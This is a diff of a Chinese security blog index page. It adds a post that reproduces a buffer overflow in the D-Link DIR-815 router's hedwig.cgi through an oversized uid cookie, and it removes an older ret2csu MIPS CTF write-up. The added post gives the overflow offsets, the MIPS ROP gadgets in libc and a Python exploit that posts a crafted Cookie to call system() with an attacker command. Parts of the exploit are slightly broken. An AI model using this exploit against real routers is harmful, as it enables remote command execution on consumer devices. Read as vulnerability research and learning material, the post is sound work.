@@ -343,6 +343,126 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/11/DIR-815%EF%BC%9AHTTP_COOKIE%E8%B6%8A%E7%95%8C%E4%BA%A7%E7%94%9F%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="OneShell">
+      <meta itemprop="description" content="菜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneShell">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/11/DIR-815%EF%BC%9AHTTP_COOKIE%E8%B6%8A%E7%95%8C%E4%BA%A7%E7%94%9F%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">DIR-815：HTTP_COOKIE越界产生的缓冲区溢出</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-04-11 02:50:43" itemprop="dateCreated datePublished" datetime="2023-04-11T02:50:43+08:00">2023-04-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-04-12 18:05:47" itemprop="dateModified" datetime="2023-04-12T18:05:47+08:00">2023-04-12</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/IoT/" itemprop="url" rel="index"><span itemprop="name">IoT</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>最近在整理以前的笔记，看到了刚开始学习IoT安全时候写的一篇流程文章，当时是跟着《解密家用路由器0day漏洞挖掘技术》一步步走的。那个时候对MIPS下的ROP、一些基础安全知识掌握得都不是很熟悉，如今重新看到了当时的笔记，决定独立重新再做一遍。</p>
+<p>漏洞的原理很简单，就是由于sprintf函数导致的缓冲区溢出。数据源来自网络包的cookie，未做长度的校验就送入到了sprintf函数中拼接字符串。漏洞的利用难点在于如何通过网络数据包发送带有00截断的system函数地址，解决方案是先将system函数地址进行数学运算保存在栈上，然后从栈上恢复后再运算恢复system函数地址。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>FirmAE是真滴好用，这篇文章我的重心也是要放在ROP利用上，因此手动搭建环境的流程就直接略过了。<br>固件下载地址在参考链接中，FirmAE是使用debug模式启动的，可以连接到仿真虚拟机的终端中，方便调试。<br><img src="/images/image-2023-0412-174315009.png" alt="undifined"><br>这里可以看到FirmAE对该虚拟机的编号IID等于3，就可以直接在images目录中去得到压缩的文件系统，不用再次使用binwalk解压出来一堆东西。<br><img src="/images/image-2023-0412-174616351.png" alt="undifined"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞是发生在程序&#x2F;htdocs&#x2F;cgibin中，该程序通过web服务程序httpd调用，httpd根据前端的请求将数据通过环境变量和标准输入传递给cgibin，cgibin执行完毕后将结果通过标准输出返回给httpd。<br>漏洞触发的流程如下：<br>httpd：<br>main-&gt;httpd_main-&gt;sub_407130-&gt;sub_406DB4-&gt;process_request-&gt;process_cgi-&gt;spawn 创建CGI进程<br>CGI：<br>main-&gt;hedwigcgi_main<br>对该漏洞调试涉及到了gdb的多进程调试，具体可以参考我之前写的这篇文章：<a href="http://oneshell.top/2023/03/10/%E8%B0%83%E8%AF%95httpd%E8%B0%83%E7%94%A8%E7%9A%84cgibin%E7%A8%8B%E5%BA%8F/">调试httpd调用的cgibin程序</a>，此处不再赘述，就简单说一下即可：<br>首先在FirmAE中找到httpd服务的进程，然后通过gdbserver attach上去：<br><img src="/images/image-2023-0412-175313065.png" alt="undifined"><br>在宿主机中执行如下的gdb调试命令，我是选择将它们全部保存到一个调试文件中，然后gdb-multiarch使用-x参数启动时运行调试命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">target remote 192.168.0.1:1234</span><br><span class="line">b *0x00409F88              # 断点到函数spawn执行fork处</span><br><span class="line">c</span><br></pre></td></tr></table></figure>
+
+<p>在此处对路由器进行发包，格式在本文后续中有。然后就会断在执行函数fork处，执行如下命令准备调试子进程cgibin：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set follow-fork-mode child # 调试cgibin子进程</span><br><span class="line">set detach-on-fork off</span><br><span class="line">catch exec</span><br></pre></td></tr></table></figure>
+
+<p>执行到cgibin中，进行调试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b *0x00409660</span><br><span class="line">c</span><br></pre></td></tr></table></figure>
+
+<p>存在溢出的缓冲区起始地址为sp+0xC0，hedwigcgi_main函数返回地址保存在sp+0x4E4，因此需要填充0x424个字节才能开始覆盖返回地址。v27的格式前17个字节是固定的字符串&#x2F;runtime&#x2F;session，随后的数据都是可控的，因此控制<code>uid=</code>后填充0x424-0x11&#x3D;0x413个字节开始覆盖返回地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int hedwigcgi_main()</span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">  char v27[1024]; // [sp+C0h] [-400h] BYREF</span><br><span class="line">......</span><br><span class="line">  sess_get_uid((int)v4);                        // /runtime/session</span><br><span class="line">  v6 = sobj_get_string(v4);</span><br><span class="line">  sprintf(v27, &quot;%s/%s/postxml&quot;, &quot;/runtime/session&quot;, v6);// uid=字符串</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因此简单构造如下的数据包就可以控制函数的返回地址为0xdeadbeef：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /hedwig.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.0.1:80</span><br><span class="line">User-Agent: python-requests/2.28.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: uid=&#123;b&quot;A&quot; * 0x413 + p32(0xdeadbeef)&#125;</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 3</span><br><span class="line">x=x</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-2023-0411-165719192.png" alt="undifined"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>查看system函数的地址，system函数位于哪一个动态库中，以及动态库的加载地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info address system</span><br><span class="line">Symbol &quot;system&quot; is at 0x77844200 in a file compiled without debugging.</span><br><span class="line">pwndbg&gt; info symbol system</span><br><span class="line">system in section .text of target:/lib/libc.so.0</span><br><span class="line">pwndbg&gt; info sharedlibrary</span><br><span class="line">From        To          Syms Read   Shared Object Library</span><br><span class="line">0x7789fa00  0x778a32b0  Yes (*)     target:/lib/ld-uClibc.so.0</span><br><span class="line">0x77870380  0x7788ccf0  Yes (*)     target:/lib/libgcc_s.so.1</span><br><span class="line">0x777face0  0x77849f50  Yes (*)     target:/lib/libc.so.0</span><br><span class="line">(*): Shared library is missing debugging information.</span><br></pre></td></tr></table></figure>
+
+<p>可以看到函数system地址的最后一个字节是00，如果直接使用的话，在数据包的处理阶段有许多字符串操作函数可能直接就截断了，也可能在格式化字符串函数sprintf处被截断。因此在ROP的时候需要进行一些运算使得payload中不包含00，且可以恢复到函数system地址。<br>常用的运算方式例如使用xor计算、先将地址进行加减运算然后恢复等，此处采用的是后者。</p>
+<p>补充一个吧，一开始自己走了弯路，在cgibin中去找了大半天的gadget，然后才想到cgibin的加载地址前两位肯定是00，最后才恍然大悟，应该在libc.so.0-&gt;libuClibc-0.9.30.1.so中去寻找。</p>
+<ol>
+<li><p>由于system函数的地址是经过计算后才能跳转执行，因此通常是选择将运算结果保存到t9，然后jr指令跳转执行。通过执行<code>mipsrop.find(&quot;move $t9&quot;)</code>发现了不少可以使用的指令，都是从其他寄存器中赋值给t9。<br>如下的这条gadget品相就极好，不仅从s0恢复了system函数的地址，还顺带设置好了栈上的字符串地址到s5再传递给a0。这条地址也可以通过<code>mipsrop.stackfinder()</code>找到。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># gadget2</span><br><span class="line">.text:000159CC                 addiu   $s5, $sp, 0x14C+var_13C</span><br><span class="line">.text:000159D0                 move    $a1, $s3</span><br><span class="line">.text:000159D4                 move    $a2, $s1</span><br><span class="line">.text:000159D8                 move    $t9, $s0</span><br><span class="line">.text:000159DC                 jalr    $t9 ; </span><br><span class="line">.text:000159E0                 move    $a0, $s5</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>以s0为例作为中间保存值的寄存器，执行<code>mipsrop.find(&quot;addiu $s0&quot;)</code>。<br>如下的gadget对s0执行了加法操作，恢复了system函数地址，还从栈上恢复了s5寄存器，用于上一条gadget传参到a0。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># gadget1</span><br><span class="line">.text:0002D194                 addiu   $s0, 1</span><br><span class="line">.text:0002D198                 move    $t9, $s5</span><br><span class="line">.text:0002D19C                 jalr    $t9</span><br><span class="line">.text:0002D1A0                 nop</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="ROP构造"><a href="#ROP构造" class="headerlink" title="ROP构造"></a>ROP构造</h2><p>可以被控制的缓冲区地址是sp+0xC0+0x11&#x3D;sp+0xD1。s0寄存器从sp+0x4C0开始恢复，因此填充0x3EF个字节开始覆盖；s5寄存器保存在sp+0x4C0+0x14&#x3D;sp+0x4D4，因此填充0x403个字节开始覆盖；ra寄存器在之前计算过，是填充0x413个字节开始覆盖。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x3EF</span> </span><br><span class="line">rop += p32(value_s0)</span><br><span class="line">rop += b <span class="string">&quot;A&quot;</span> * (<span class="number">0x403</span> - <span class="built_in">len</span>(rop))</span><br><span class="line">rop += p32(value_s5)</span><br><span class="line">rop += b <span class="string">&quot;A&quot;</span> * (<span class="number">0x413</span> - <span class="built_in">len</span>(rop))</span><br><span class="line">rop += p32(gadget_1)</span><br><span class="line">rop += b <span class="string">&quot;A&quot;</span> * <span class="number">4</span></span><br></pre></td></tr></table></figure>
+
+<p>验证如下，成功开始执行gadget：<br><img src="/images/image-2023-0412-151500966.png" alt="undifined"><br>但是此时还没有将要执行的命令布局到栈上。根据gadget2，命令在sp+0x10处，因此：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rop += <span class="string">b&quot;A&quot;</span> * <span class="number">0x10</span></span><br><span class="line">rop += cmd</span><br></pre></td></tr></table></figure>
+<p>验证如下，要执行的命令和缓冲区中的数据结合了，但也证明了成功利用：<br><img src="/images/image-2023-0412-154442722.png" alt="undifined"></p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>修改完毕的一个exp如下，这个exp在我的环境中调试是可以输入命令到system函数的，但是执行命令似乎失败了。不管了。。。ROP已经调试好了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">API = <span class="string">&quot;http://192.168.0.1:80/hedwig.cgi&quot;</span></span><br><span class="line"></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_payload</span>(<span class="params">libc_base, cmd</span>):</span><br><span class="line">    rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x3EF</span> </span><br><span class="line">    rop += p32(libc_base + <span class="number">0x00053200</span> - <span class="number">1</span>)  <span class="comment"># s0</span></span><br><span class="line">    rop += <span class="string">b&quot;A&quot;</span> * (<span class="number">0x403</span> - <span class="built_in">len</span>(rop))</span><br><span class="line">    rop += p32(libc_base + <span class="number">0x000159CC</span>)  <span class="comment"># s5</span></span><br><span class="line">    rop += <span class="string">b&quot;A&quot;</span> * (<span class="number">0x413</span> - <span class="built_in">len</span>(rop))</span><br><span class="line">    rop += p32(libc_base + <span class="number">0x0002D194</span>)  <span class="comment"># ra</span></span><br><span class="line"></span><br><span class="line">    rop += <span class="string">b&quot;A&quot;</span> * <span class="number">0x10</span></span><br><span class="line">    rop += cm</span><br><span class="line">    <span class="keyword">return</span> rop</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cookie = <span class="string">b&quot;uid=&quot;</span> + gen_payload(libc_base=<span class="number">0x77F34000</span>, cmd)</span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span> : cookie,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span> : <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;x&quot;</span> : <span class="string">&quot;x&quot;</span>&#125;</span><br><span class="line">    res = requests.post(url=API, headers=header, data=data)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>整个复现过程用了大概一天的时间，主要耗费在了找gadget上。我一开始是直接在cgibin程序中去找的gadget，等找了一大串又多又臭的ROP链才想到，cgibin程序本身的加载地址就是以00开头的。后面才醒悟过来应该在libc库中去寻找gadget。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://rebyte.me/en/d-link/89510/file-592084/">File DIR-815_FIRMWARE_1.01.ZIP — Firmware for D-link DIR-815</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
     <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/10/split_armel/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1207,94 +1327,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/04/ret2csu_mipsel/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="OneShell">
-      <meta itemprop="description" content="菜">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="OneShell">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/04/04/ret2csu_mipsel/" class="post-title-link" itemprop="url">ret2csu_mipsel</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-04-04 03:34:42" itemprop="dateCreated datePublished" datetime="2023-04-04T03:34:42+08:00">2023-04-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-11 13:57:07" itemprop="dateModified" datetime="2023-04-11T13:57:07+08:00">2023-04-11</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/MIPSROP/" itemprop="url" rel="index"><span itemprop="name">MIPSROP</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>ret2csu就是使用_libc_csu_init中的代码片段来达到调用任意三个（及以下）函数的ROP作用。此处查看_libc_csu_init函数中的两段代码片段：<br>这段代码可以从栈上恢复s0~s5、ra，并跳转到ra去执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:004009C0 loc_4009C0:                              # CODE XREF: __libc_csu_init+58↑j</span><br><span class="line">.text:004009C0                 lw      $ra, 0x1C+var_s18($sp)</span><br><span class="line">.text:004009C4                 lw      $s5, 0x1C+var_s14($sp)</span><br><span class="line">.text:004009C8                 lw      $s4, 0x1C+var_s10($sp)</span><br><span class="line">.text:004009CC                 lw      $s3, 0x1C+var_sC($sp)</span><br><span class="line">.text:004009D0                 lw      $s2, 0x1C+var_s8($sp)</span><br><span class="line">.text:004009D4                 lw      $s1, 0x1C+var_s4($sp)</span><br><span class="line">.text:004009D8                 lw      $s0, 0x1C+var_s0($sp)</span><br><span class="line">.text:004009DC                 jr      $ra</span><br><span class="line">.text:004009E0                 addiu   $sp, 0x38</span><br></pre></td></tr></table></figure>
-<p>这段代码可以从s系列寄存器恢复到a0、a1、a2、t9，达到调用三参数函数的作用。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:004009A0 loc_4009A0:                              # CODE XREF: __libc_csu_init+78↓j</span><br><span class="line">.text:004009A0                 lw      $t9, 0($s0)</span><br><span class="line">.text:004009A4                 addiu   $s1, 1</span><br><span class="line">.text:004009A8                 move    $a2, $s5</span><br><span class="line">.text:004009AC                 move    $a1, $s4</span><br><span class="line">.text:004009B0                 jalr    $t9</span><br><span class="line">.text:004009B4                 move    $a0, $s3</span><br></pre></td></tr></table></figure>
-<p>接下来还是查看一下pwnme函数：缓冲区起始地址在sp+0x18，返回地址保存在sp+0x3c，可以控制的输入大小是0x200。<br>利用过程：<br>还是先溢出覆盖到返回地址，控制到从栈上恢复寄存器：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line">rop += p32(load_regs)</span><br></pre></td></tr></table></figure>
-<p>然后从寄存器恢复函数参数，并从GOT表调用ret2win函数：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x1C</span></span><br><span class="line">rop += p32(ret2win_got) <span class="comment"># ret2win,s0</span></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">4</span> <span class="comment"># s1无用</span></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">4</span> <span class="comment"># s2无用</span></span><br><span class="line">rop += p32(<span class="number">0xDEADBEEF</span>) <span class="comment"># s3-&gt;a0</span></span><br><span class="line">rop += p32(<span class="number">0xCAFEBABE</span>) <span class="comment"># s4-&gt;a1</span></span><br><span class="line">rop += p32(<span class="number">0xD00DF00D</span>) <span class="comment"># s5-&gt;a2</span></span><br><span class="line">rop += p32(call_ret2win)</span><br></pre></td></tr></table></figure>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">BINARY = <span class="string">&quot;./ret2csu_mipsel&quot;</span></span><br><span class="line">ELF = ELF(BINARY)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.binary = BINARY</span><br><span class="line"></span><br><span class="line">load_regs = <span class="number">0x004009C0</span></span><br><span class="line"></span><br><span class="line">ret2win_got = <span class="number">0x00411058</span></span><br><span class="line">call_ret2win = <span class="number">0x004009A0</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;10.0.0.2&quot;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line">rop += p32(load_regs)</span><br><span class="line"></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x1C</span></span><br><span class="line">rop += p32(ret2win_got) <span class="comment"># ret2win,s0</span></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">4</span> <span class="comment"># s1无用</span></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">4</span> <span class="comment"># s2无用</span></span><br><span class="line">rop += p32(<span class="number">0xDEADBEEF</span>) <span class="comment"># s3-&gt;a0</span></span><br><span class="line">rop += p32(<span class="number">0xCAFEBABE</span>) <span class="comment"># s4-&gt;a1</span></span><br><span class="line">rop += p32(<span class="number">0xD00DF00D</span>) <span class="comment"># s5-&gt;a2</span></span><br><span class="line">rop += p32(call_ret2win)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(rop)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline_contains(<span class="string">b&quot;ROPE&quot;</span>))</span><br></pre></td></tr></table></figure>
-<p>效果如下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3 ret2csu.py</span></span><br><span class="line">[*] &#x27;/home/utest/rop_practice/mipsel/ret2csu_mipsel/ret2csu_mipsel&#x27;</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RUNPATH:  b&#x27;.&#x27;</span><br><span class="line">[+] Opening connection to 10.0.0.2 on port 9999: Done</span><br><span class="line">b&#x27;ROPE&#123;a_placeholder_32byte_flag!&#125;&#x27;</span><br><span class="line">[*] Closed connection to 10.0.0.2 port 9999</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1364,20 +1396,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-count">33</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">13</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
